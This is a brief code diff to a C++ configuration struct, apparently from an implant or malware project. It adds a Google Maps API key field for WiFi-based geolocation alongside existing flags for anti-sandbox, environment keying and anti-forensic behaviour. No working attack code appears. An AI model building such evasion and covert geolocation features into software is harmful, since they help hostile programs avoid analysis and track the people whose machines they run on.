@@ -46,6 +46,9 @@ struct Config {
     bool anti_sandbox = true;
     bool environment_keying = true;
     bool anti_forensic = false;
+
+    // Geolocation
+    std::string google_maps_api_key;        // For WiFi-based geolocation via Google API
 };
 
 } // namespace nuub::domain::entities
